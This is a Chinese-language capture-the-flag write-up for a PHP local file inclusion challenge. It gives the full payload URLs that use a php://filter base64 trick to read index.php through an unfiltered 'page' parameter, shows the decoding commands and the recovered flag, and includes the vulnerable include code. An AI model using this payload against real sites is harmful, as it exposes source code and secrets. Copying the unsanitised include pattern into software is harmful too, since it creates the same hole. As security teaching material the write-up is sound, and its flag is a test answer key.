# 18-lfi-read-source

## 题目地址

```text
http://47.120.76.57:34099/
```

## 考点

LFI / 本地文件包含读源码。

页面提示：

```text
参数 page 指定要载入的模板文件名（不带后缀）
```

说明后端大概率用 `page` 参数拼接文件名再 `include`。

## 手工复刻

### 1. 访问首页

打开：

```text
http://47.120.76.57:34099/
```

可以看到导航：

```text
/?page=home
/?page=about
/?page=contact
```

所以可控参数是：

```text
page
```

### 2. 用 php filter 读源码

PHP 文件直接访问会被执行，看不到源码。

所以用 `php://filter/convert.base64-encode/resource=` 让 PHP 把源码 base64 输出。

Payload：

```text
php://filter/convert.base64-encode/resource=index
```

完整 URL：

```text
http://47.120.76.57:34099/?page=php://filter/convert.base64-encode/resource=index
```

如果浏览器自动编码也没关系，等价于：

```text
http://47.120.76.57:34099/?page=php%3A%2F%2Ffilter%2Fconvert.base64-encode%2Fresource%3Dindex
```

### 3. 复制 Base64

访问后，在页面中间的框里会看到一大段 Base64，开头类似：

```text
PD9waHAKLy8gPT09PT09...
```

复制这段内容。

### 4. 解码 Base64

命令行解码：

```bash
echo '复制到的Base64内容' | base64 -d
```

或者用 Python：

```bash
python3 - <<'PY'
import base64
s = '复制到的Base64内容'
print(base64.b64decode(s).decode())
PY
```

### 5. 得到 flag

解码后的 `index.php` 源码里有：

```php
// flag: TOGOGO-flag{989b0926-e39f-4733-be7f-942a537ba5e1}
```

最终 flag：

```text
TOGOGO-flag{989b0926-e39f-4733-be7f-942a537ba5e1}
```

## 漏洞原因

源码逻辑类似：

```php
$page = $_GET['page'] ?? 'home';
$file = $page . '.php';
@include $file;
```

`page` 参数没有过滤，直接进入 `include`。

当传入：

```text
php://filter/convert.base64-encode/resource=index
```

后端会拼接成类似：

```text
php://filter/convert.base64-encode/resource=index.php
```

于是 PHP 返回 `index.php` 的 Base64 源码。
